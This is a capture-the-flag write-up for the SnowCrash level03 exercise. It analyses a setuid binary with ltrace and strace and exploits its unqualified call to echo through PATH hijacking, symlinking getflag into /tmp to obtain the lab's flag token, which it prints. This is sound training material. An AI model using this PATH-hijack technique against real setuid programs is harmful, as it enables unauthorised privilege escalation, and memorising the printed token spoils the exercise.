# A classic

```sh
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```

According to chmod's man "s" rights are to:
`set user or group ID on execution (s)`
> It is a security tool that permits users to run certain programs with escalated privileges

```sh
level03@SnowCrash:~$ ./level03
Exploit me
```

## Analyse

## ltrace

> ltrace to see lib calls

```sh
[...]
getegid() //get effective groupId
geteuid() /get effective userId
[...]
system("/usr/bin/env echo Exploit me"Exploit me //pass env et execut with it
```

## strace

> strace to see system calls

> real id = user id (in shell)

> effective uid = run time user id

```sh
[...]
//getegid
//geteuid
setresgid32(2003, 2003, 2003) //set le groupe pour avoir les droits
setresuid32(2003, 2003, 2003) //set le user pour avoir les droits
[...]
```

# Dig

`cat /usr/bin/env` show smiley and kill the ssh connection (thank you 42)

We can see that echo is not call with the full path so:

```sh
level03@SnowCrash:/tmp$ whereis echo
echo: /bin/echo /usr/share/man/man1/echo.1.gz
level03@SnowCrash:/tmp$ whereis getflag
getflag: /bin/getflag
level03@SnowCrash:/tmp$ ln -s /bin/getflag /tmp/echo
level03@SnowCrash:/tmp$ export PATH="/tmp/:$PATH"
```

> /tmp is the only directory where I can write

# The revelation

`
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
`

getflag is run with run time user (and therefore his rights)
